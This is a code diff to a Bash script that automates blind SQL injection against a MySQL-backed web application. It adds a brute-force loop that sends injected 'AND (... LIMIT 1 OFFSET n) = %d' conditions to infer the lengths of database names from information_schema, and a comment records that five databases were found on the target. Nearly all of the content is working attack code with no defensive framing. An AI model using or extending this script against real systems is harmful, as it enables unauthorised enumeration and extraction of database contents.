@@ -13,13 +13,37 @@
 
 MYSQL_STANDARD_DATABASES=('mysql','information_schema')
 
+function loopThrow() {
+	START=1
+	END=100
+	placeholderSqli="$1"
+	for (( index=$START; index<=$END; index++)); do
+		sqli="$(printf "${placeholderSqli}" "$index")"
+		request "$sqli"
+                result=$(echo $?)
+                if [ $result -eq 0 ]; then
+                        echo $index
+                        break
+                fi
+	done
+}
+
 function getLength() {
 	echo 'i get you the length'
 	# store the length in array!
 	# required: ??
 	# parameter: ??
 	# IT Create from three parameter the sqli!
-	sqli="SELECT LENGTH(${column}) FROM ${tableName} WHERE ${condition} LIMIT ? OFFSET ?"
+
+	START_Y=1
+        END_Y=$2
+	sqlQuery="$1"
+
+	for (( indey=$START_Y; indey<=$END_Y; indey++)); do
+		count=$((indey-1))
+		sqli="AND (${sqlQuery} LIMIT 1 OFFSET $count) = %d"
+		loopThrow "$sqli"
+	done
 }
 
 function encodeToUrl() {
@@ -32,7 +56,7 @@ function encodeToUrl() {
 }
 
 function getAmount() {
-	echo 'i get the amount of the tables/columns/content'
+	#echo 'i get the amount of the tables/columns/content'
 	# required:
 	# - database
 	# - sqli
@@ -95,4 +119,7 @@ PATH="products/1"
 # which are in mysql standard?
 # mysql, information_schema
 
-getAmount 'SELECT COUNT(*) FROM information_schema.schemata'
+#amountOfDatabases=$(getAmount 'SELECT COUNT(*) FROM information_schema.schemata')
+#echo "There are ${amountOfDatabases} in the server"
+# es sind 5 databases drinne!
+getLength 'SELECT length(schema_name) FROM information_schema.schemata' '5'
